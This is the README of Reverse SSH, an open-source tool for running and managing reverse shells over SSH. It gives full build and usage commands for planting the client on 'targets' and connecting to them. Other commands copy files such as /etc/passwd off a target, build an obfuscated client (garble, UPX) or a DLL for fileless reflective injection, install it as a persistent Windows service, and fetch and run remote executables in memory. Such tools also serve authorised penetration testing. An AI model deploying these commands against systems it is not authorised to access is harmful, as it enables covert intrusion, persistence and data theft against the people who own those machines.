# Reverse SSH
![icon](379C510D-DFD2-4DA1-91BA-C739B95BCBCD.jpg)  
(Art credit to https://www.instagram.com/smart.hedgehog.art/)

Want to use SSH for reverse shells? Now you can.  

- Manage and connect to reverse shells with native SSH syntax
- Dynamic, local and remote forwarding
- Native SCP and SFTP implementations for retrieving files from your targets
- Full windows shell
- Mutual client & server authentication to create high trust control channels  
And more! 


```text
                    +----------------+                 +---------+
                    |                |                 |         |
                    |                |       +---------+   RSSH  |
                    |    Reverse     |       |         |  Client |
                    |  SSH server    |       |         |         |
                    |                |       |         +---------+
+---------+         |                |       |
|         |         |                |       |
| Human   |   SSH   |                |  SSH  |         +---------+
| Client  +-------->+                <-----------------+         |
|         |         |                |       |         |   RSSH  |
+---------+         |                |       |         |  Client |
                    |                |       |         |         |
                    |                |       |         +---------+
                    |                |       |
                    |                |       |
                    +----------------+       |         +---------+
                                             |         |         |
                                             |         |   RSSH  |
                                             +---------+  Client |
                                                       |         |
                                                       +---------+
```

- [Reverse SSH](#reverse-ssh)
  - [TL;DR](#tldr)
    - [Setup](#setup)
    - [Running](#running)
  - [Setup Instructions](#setup-instructions)
  - [Fancy Features](#fancy-features)
    - [Default Server](#default-server)
    - [Built in Web Server](#built-in-web-server)
    - [Windows DLL Generation](#windows-dll-generation)
    - [SSH Subsystem](#ssh-subsystem)
      - [All](#all)
      - [Linux](#linux)
      - [Windows](#windows)
    - [Windows Service Integration](#windows-service-integration)
    - [Full Windows Shell Support](#full-windows-shell-support)
    - [Webhooks](#webhooks)
    - [Executable Downloading](#executable-downloading)
      - [Supported URI Schemes](#supported-uri-schemes)
- [Help](#help)
  - [Garble](#garble)
  - [Windows and SFTP](#windows-and-sftp)
  - [Server started with `--insecure` still has `Failed to handshake`](#server-started-with---insecure-still-has-failed-to-handshake)
  - [Foreground vs Background (Important note about clients)](#foreground-vs-background-important-note-about-clients)
- [Donations, Support, or Giving Back](#donations-support-or-giving-back)

## TL;DR

### Setup

Docker:
```
docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your_external_address>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v data:/data reversessh/reverse_ssh
```

Manual:
```sh
git clone https://github.com/NHAS/reverse_ssh

cd reverse_ssh

make
cd bin/

# start the server
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232
```

### Running

```sh
# copy client to your target then connect it to the server
./client -d our.rssh.server.com:3232

# Get help text
ssh your.rssh.server.com -p 3232 help

# See clients
ssh your.rssh.server.com -p 3232 ls -t

                                Targets
+------------------------------------------+------------+-------------+
| ID                                       | Hostname   | IP Address  |
+------------------------------------------+------------+-------------+
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
+------------------------------------------+------------+-------------+


# Connect to full shell
ssh -J your.rssh.server.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac

# Or using hostname 

ssh -J your.rssh.server.com:3232 root.wombo

```

## Setup Instructions

> **NOTE:** reverse_ssh requires Go **1.17** or higher. Please check you have at least this version via `go version`

The simplest build command is just:

```sh
make
```

Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy the corresponding public key to the `authorized_controllee_keys` file to enable the reverse shell to connect.

Golang allows your to effortlessly cross compile, the following is an example for building windows:

```sh
GOOS=windows GOARCH=amd64 make client # will create client.exe
```

You will need to create an `authorized_keys` file much like the ssh http://man.he.net/man5/authorized_keys, this contains *your* public key.
This will allow you to connect to the RSSH server.

Alternatively, you can use the --authorizedkeys flag to point to a file.

```sh
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232 #Set the server to listen on port 3232
```

Put the client binary on whatever you want to control, then connect to the server.

```sh
./client -d your.rssh.server.com:3232
```

You can then see what reverse shells have connected to you using `ls`:

```sh
ssh your.rssh.server.com -p 3232 ls -t
                                Targets
+------------------------------------------+------------+-------------+
| ID                                       | Hostname   | IP Address  |
+------------------------------------------+------------+-------------+
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
+------------------------------------------+------------+-------------+

```

Then typical ssh commands work, just specify your rssh server as a jump host. 

```sh
# Connect to full shell
ssh -J your.rssh.server.com:3232 root.wombo

# Run a command without pty
ssh -J your.rssh.server.com:3232 root.wombo help

# Start remote forward 
ssh -R 1234:localhost:1234 -J your.rssh.server.com:3232 root.wombo

# Start dynamic forward 
ssh -D 9050 -J your.rssh.server.com:3232 root.wombo

# SCP 
scp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .

#SFTP
sftp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .

```

## Fancy Features

### Default Server

Specify a default server at build time:

```sh
$ RSSH_HOMESERVER=your.rssh.server.com:3232 make

# Will connect to your.rssh.server.com:3232, even though no destination is specified
$ bin/client

# Behaviour is otherwise normal; will connect to the supplied host, e.g example.com:3232
$ bin/client example.com:3232
```

### Built in Web Server

The RSSH server can also run an HTTP server on the same port as the RSSH server listener which serves client binaries.  The server must be placed in the project `bin/` folder, as it needs to find the client source.

```sh
./server --webserver :3232

# Generate an unnamed link
ssh your.rssh.server.com -p 3232

catcher$ link -h

link [OPTIONS]
Link will compile a client and serve the resulting binary on a link which is returned.
This requires the web server component has been enabled.
	-t	Set number of minutes link exists for (default is one time use)
	-s	Set homeserver address, defaults to server --external_address if set, or server listen address if not.
	-l	List currently active download links
	-r	Remove download link
	--goos	Set the target build operating system (default to runtime GOOS)
	--goarch	Set the target build architecture (default to runtime GOARCH)
	--name	Set link name
	--shared-object	Generate shared object file
  --fingerprint Set RSSH server fingerprint will default to server public key
  --upx   Use upx to compress the final binary (requires upx to be installed)
  --garble	Use garble to obfuscate the binary (requires garble to be installed)

# Build a client binary
catcher$ link --name test
http://your.rssh.server.com:3232/test

```

Then you can download it as follows:

```sh
wget http://your.rssh.server.com:3232/test
chmod +x test
./test
```
### Windows DLL Generation 

You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). 
This will need a cross compiler if you are doing this on linux, use `mingw-w64-gcc`. 

```bash
CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll
```

When the RSSH server has the webserver enabled you can also compile it with the link command: 

```
./server --webserver :3232

# Generate an unnamed link
ssh your.rssh.server.com -p 3232

catcher$ link --name windows_dll --shared-object --goos windows
http://your.rssh.server.com:3232/windows_dll
```

Which is useful when you want to do fileless injection of the rssh client. 

### SSH Subsystem

The SSH ecosystem allowsy out define and call subsystems with the `-s` flag. In RSSH this is repurposed to provide special commands for platforms. 


#### All
`list`  Lists avaiable subsystem  
`sftp`: Runs the sftp handler to transfer files  

#### Linux
`setgid`:   Attempt to change group  
`setuid`:   Attempt to change user  

#### Windows
`service`: Installs or removes the rssh binary as a windows service, requires administrative rights  


e.g

```
# Install the rssh binary as a service (windows only)
ssh -J your.rssh.server.com:3232 test-pc.user.test-pc -s service --install
```

### Windows Service Integration

The client RSSH binary supports being run within a windows service and wont time out after 10 seconds. This is great for creating persistent management services. 



### Full Windows Shell Support

Most reverse shells for windows struggle to generate a shell environment that supports resizing, copying and pasting and all the other features that we're all very fond of. 
This project uses conpty on newer versions of windows, and the winpty library (which self unpacks) on older versions. This should mean that almost all versions of windows will net you a nice shell. 

### Webhooks

The RSSH server can send out raw HTTP requests set using the `webhook` command from the terminal interface.

First enable a webhook:
```bash
$ ssh your.rssh.server.com -p 3232
catcher$ webhook --on http://localhost:8080/
```

Then disconnect, or connect a client, this will when issue a `POST` request with the following format.


```bash
$ nc -l -p 8080
POST /rssh_webhook HTTP/1.1
Host: localhost:8080
User-Agent: Go-http-client/1.1
Content-Length: 165
Content-Type: application/json
Accept-Encoding: gzip

{"Status":"connected","ID":"ae92b6535a30566cbae122ebb2a5e754dd58f0ca","IP":"[::1]:52608","HostName":"user.computer","Timestamp":"2022-06-12T12:23:40.626775318+12:00"}%  
```


As an additional note, please use the `/slack` endpoint if connecting this to discord. 

### Executable Downloading

When specifying what executable the rssh binary should run, either when connecting with a full PTY session or raw execution the client supports URI schemes to download offhost executables.

For example. 

```
connect --shell https://your.host/program <rssh_client_id>
ssh -J your.rssh.server:3232 <rssh_client_id> https://your.host/program 
```


#### Supported URI Schemes

`http/https`: Pure web downloading

`rssh`: Download via the rssh server
The rssh server will serve content from the `downloads` directory in the executables working directory.  
  
Both of these methods will opportunistically use [memfd](https://man7.org/linux/man-pages/man2/memfd_create.2.html) which will not write any executables to disk. 


# Help

## Garble

However the `@latest` release has a bug that causes panics with generic code.   
If you are installing this manually use the following, you will need `golang 1.20+` for this:

```sh
go install mvdan.cc/garble@latest
```

Then make sure that the `go/bin/` directory is in your `$PATH`


## Windows and SFTP

Due to the limitations of SFTP (or rather the library Im using for it). Paths need a little more effort on windows.

```
sftp -r -J your.rssh.server.com:3232 test-pc.user.test-pc:'/C:/Windows/system32'
```

Note the `/` before the starting character. 

## Server started with `--insecure` still has `Failed to handshake`
  
If the client binary was generated with the `link` command this client has the server public key fingerprint baked in by default. If you lose your server private key, the clients will no longer be able to connect.  
You can also generate clients with `link --fingerprint <fingerprint here>` to specify a fingerprint, there isnt currently a way to disable this as per version 1.0.13.  

## Foreground vs Background (Important note about clients)

By default, clients will run in the background. When started they will execute a new background instance (thus forking a new child process) and then the parent process will exit. If the fork is successful the message "Ending parent" will be printed.

This has one important ramification: once in the background a client will not show any output, including connection failure messages. If you need to debug your client, use the `--foreground` flag.

# Donations, Support, or Giving Back
  
The easiest way to give back to the RSSH project is by finding bugs, opening feature requests and word-of-mouth advertising it to people you think will find it useful!  
  
However, if you want to give something back to me, you can do so either throught Kofi (under "Sponsor this Project" on the right hand side).   
Or donate to me directly by sending to the either of the following wallets:  

Monero (XMR):  
`8A8TRqsBKpMMabvt5RxMhCFWcuCSZqGV5L849XQndZB4bcbgkenH8KWJUXinYbF6ySGBznLsunrd1WA8YNPiejGp3FFfPND`
Bitcoin (BTC):  
`bc1qm9e9sfrm7l7tnq982nrm6khnsfdlay07h0dxfr`